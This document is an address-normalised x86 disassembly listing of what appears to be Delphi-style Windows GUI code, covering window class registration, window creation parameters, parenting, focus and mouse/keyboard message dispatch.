mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoW
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoW
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoW
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoW
sub_492658
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_48e6b4
test al al
je r-xdata
mov eax ebx
call sub_48e6e4
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc7
call sub_4483f8
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_4483f8
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_4483f8
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_4926c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4927c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0xcc
call sub_447ae4
mov eax [ esi + 0x16c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_492658
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1e0 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x1cc ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_496868
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
push 0x7f00
push 0x0
call LoadCursorW
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
mov eax DefWindowProcW
mov [ ebx + 0x28 ] eax
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_448088
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_43614c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4927ce
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4927d4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
xor edx edx
mov [ ebp - 0x100 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4929b3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xcc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ ebp - 0xb0 ] 0x0
jne r-xdata
mov eax [ ebp - 0xa4 ]
mov [ esi + 0x248 ] eax
lea eax [ ebp - 0xf4 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp - 0x98 ]
push eax
call GetClassInfoW
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0xc5 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_48a5c8
cmp edx [ ebp - 0xf0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0xa4 ] sub_48a5c8
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0xa8 ]
push eax
call RegisterClassW
test ax ax
jne r-xdata
mov eax [ ebp - 0x98 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call UnregisterClassW
mov [ rw-data ] esi
lea edx [ ebp - 0xcc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xa0 ]
cmp [ esi + 0x24c ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xfc ] eax
mov [ ebp - 0xf8 ] 0x11
lea eax [ ebp - 0xfc ]
push eax
push 0x0
lea edx [ ebp - 0x100 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x100 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_43ba38
push 0xfffffff0
mov eax [ esi + 0x24c ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
call sub_43ba38
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ esi + 0x16c ]
call sub_436444
xor eax eax
mov [ esi + 0x16c ] eax
mov eax esi
call sub_496c20
push 0x1
mov eax [ esi + 0x64 ]
call sub_46d5ec
mov ecx eax
mov edx 0x30
mov eax esi
call sub_48f2b0
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x24c ]
push eax
call GetWindowLongW
test eax eax
jne r-xdata
mov eax ebx
call sub_496868
mov [ ebp - 0xb0 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4929ba
lea eax [ ebp - 0x100 ]
call j_sub_449348
retn
mov eax esi
mov si 0xffee
call sub_4483f8
mov eax [ esi + 0x24c ]
push eax
push 0xfffffff4
push eax
call SetWindowLongW
sub_4929c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_41d3e0
mov [ esi + 0x24c ] eax
pop esi
pop ebx
retn
sub_492a00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4297c4
mov eax esi
call sub_429714
mov [ ebx + 0x258 ] eax
mov eax esi
call sub_429714
mov [ ebx + 0x25c ] eax
or [ ebx + 0x88 ] 0x20
mov eax esi
call sub_4297cc
pop esi
pop ebx
retn
sub_492a38
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x258 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x25c ] eax
mov eax esi
call sub_42bc4c
mov edx [ ebx + 0x258 ]
mov eax esi
call sub_42bb80
mov edx [ ebx + 0x25c ]
mov eax esi
call sub_42bb80
mov eax esi
call sub_42bc54
add esp 0x10
pop esi
pop ebx
retn
sub_492aa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x258 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x258
call sub_492a8c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d4 ]
mov edx esi
call sub_4246e8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d8 ]
mov edx esi
call sub_4246e8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_492b80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_48f9c8
mov eax [ ebp - 0x8 ]
push eax
push sub_492a00
mov eax [ ebp - 0x8 ]
push eax
push sub_492a38
push ebp
call sub_492aa0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_492bec
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x16c ] 0x0
jne r-xdata
call sub_48c57c
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_48df00
mov ebx eax
cmp ebx 0x1
jge r-xdata
lea eax [ ebx + 0x1 ]
call sub_436404
mov edi eax
mov [ esi + 0x16c ] edi
mov eax edi
call sub_43640c
mov ecx eax
mov edx edi
mov eax esi
call sub_48df10
mov eax r-xdata
call sub_436418
mov [ esi + 0x16c ] eax
jmp r-xdata
sub_492c54
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_492ca1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_492ca8
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_43ba38
sub_492cb8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x1d8 ]
mov edx ebx
call sub_424744
mov esi eax
inc esi
mov eax [ edi + 0x1d8 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x1d8 ]
mov edx esi
call sub_4246e8
mov eax [ eax + 0x24c ]
test eax eax
jne r-xdata
sub_492d00
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x24c ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa4 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x24c ]
push eax
call SetPropW
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x24c ]
push eax
call SetPropW
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_492534
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_492cb8
push eax
mov eax [ ebx + 0x24c ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4924f8
call sub_48d40c
inc edi
dec esi
jne r-xdata
sub_492d98
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
pop ebx
retn
sub_492dbc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
cmp [ esi + 0x23a ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
push ecx
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
mov ecx edx
mov edx eax
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_492e0c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_48a70c
test eax eax
jne r-xdata
push 0xfffffff8
push ebx
call GetWindowLongW
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call SendMessageW
sub_492e50
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x24c ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1d8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x24c ]
mov [ esp ] eax
test [ esi + 0x55 ] 0x20
setne dl
mov [ esp + 0x4 ] dl
mov edx esp
push edx
push sub_492e0c
push eax
call EnumChildWindows
mov eax esi
mov edx [ eax ]
call [ edx + 0xb8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov edx edi
mov eax [ esi + 0x1d8 ]
call sub_4246e8
mov edx [ eax ]
call [ edx + 0xb0 ]
inc edi
dec ebx
jne r-xdata
sub_492edc
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4483f8
mov [ ebp - 0x5 ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_497e0c
xor eax eax
push ebp
push sub_492f38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
call sub_4930c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_492f3f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_497e0c
retn
sub_492f3f
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
call SetFocus
sub_492f68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
jne r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1e2 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x98 ]
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x1e2 ] dl
xor eax eax
push ebp
push sub_4930a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e7 ] 0x1
xor eax eax
push ebp
push sub_493092
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_48f2b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e7 ] 0x0
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d8 ]
mov edx esi
call sub_4246e8
call sub_492f68
inc esi
dec ebx
jne r-xdata
sub_4930c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
jne r-xdata
mov ebx esi
cmp [ ebx + 0x1e2 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e7 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_492f68
cmp [ ebx + 0x1cc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e7 ] 0x1
xor eax eax
push ebp
push sub_49314c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e2 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_48f2b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e7 ] 0x0
retn
sub_4931bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x1cc ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_497e0c
xor eax eax
push ebp
push sub_493295
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1cc ] ebx
mov eax [ ebp - 0x4 ]
call sub_4930c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_497e0c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1cc ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1cc ] ebx
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4930c8
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov ecx 0x30003
mov edx 0x127
mov eax [ ebp - 0x4 ]
call sub_48f2b0
sub_4932a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4488a4#3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4932e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4932ee
call sub_48c57c
call sub_47029c
retn
sub_493318
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov ebx eax
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_432a5c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0xc ]
mov [ eax - 0x8 ] edx
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
add edx 0xfffffff4
call sub_432a8c
test al al
je r-xdata
xor eax eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov [ ebp - 0x8 ] edx
mov edx [ eax - 0x8 ]
mov [ ebp - 0x4 ] edx
mov esi [ ebp - 0x8 ]
and esi 0xffff
mov eax [ ebp - 0x4 ]
shl eax 0x10
or esi eax
push esi
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_48f2b0
test eax eax
setne al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_4933e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x1d4 ]
test eax eax
je r-xdata
cmp [ esi + 0x1d8 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x1d8 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
test bl bl
je r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1d4 ]
call sub_4246e8
call sub_493318
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x1
push 0x1
mov edx edi
mov eax [ esi + 0x1d8 ]
call sub_4246e8
mov edx [ ebp - 0x4 ]
movzx ecx [ ebp - 0xd ]
call sub_4933e8
mov [ ebp - 0x14 ] eax
dec edi
cmp edi 0xffffffff
jne r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1d8 ]
call sub_4246e8
call sub_493318
pop ecx
test al al
jne r-xdata
sub_4934ac
push ebx
push esi
push edi
add esp 0xffffffec
mov esi edx
mov ebx eax
mov eax ebx
call sub_496868
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
xor ecx ecx
mov eax ebx
call sub_4933e8
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx edi [ esi + 0xa ]
sub edi [ ebx + 0x44 ]
mov [ esp + 0x4 ] edi
mov eax [ esp ]
and eax 0xffff
shl edi 0x10
or eax edi
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_48f2b0
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_493554
push ebx
push esi
push edi
add esp 0xfffffed8
mov ebx ecx
mov edi edx
mov esi eax
call GetMessagePos
call sub_432a74
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
mov ecx esp
lea edx [ esp + 0xc ]
mov eax esi
call sub_48dac0
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_4933e8
mov ebx eax
xor eax eax
cmp esi ebx
je r-xdata
mov eax [ esp ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x118 ] eax
mov eax [ esp ]
sub eax [ ebx + 0x40 ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x118 ] eax
jmp r-xdata
add eax 0xfffffdff
sub eax 0x2
jb r-xdata
add eax 0xffffff5f
sub eax 0x2
jb r-xdata
movzx eax [ edi + 0x8 ]
mov [ esp + 0x11c ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x124 ] eax
movzx eax [ edi + 0xa ]
cmp eax 0x201
jge r-xdata
mov [ esp + 0x120 ] 0x0
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
lea eax [ esp + 0x14 ]
push eax
call GetKeyboardState
lea eax [ esp + 0x14 ]
call sub_476f28
mov [ esp + 0x121 ] al
lea eax [ esp + 0x114 ]
push eax
xor ecx ecx
mov edx 0xb04b
mov eax ebx
call sub_48f2b0
mov [ edi + 0xc ] eax
mov al 0x1
jmp r-xdata
mov [ esp + 0x120 ] 0x1
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
add esp 0x128
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x120 ] 0x2
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ esp + 0x120 ] 0x0
sub_4936a0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx eax
cmp edx 0x200
jge r-xdata
cmp edx 0xb04a
jg r-xdata
cmp edx 0x21
jg r-xdata
sub edx 0xb04e
je r-xdata
je r-xdata
sub edx 0x84
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
sub edx 0x3
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
add edx 0xfffffe00
sub edx 0xb
jb r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48f3dc
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0xffffffff
jne r-xdata
add edx 0xffffff84
sub edx 0xa
jb r-xdata
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_493554
test al al
je r-xdata
sub edx 0x7
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48f3dc
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x128
jne r-xdata
call sub_44c2c8
cmp [ eax + 0x5 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_492554
jmp r-xdata
xor eax eax
push ebp
push sub_493b9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
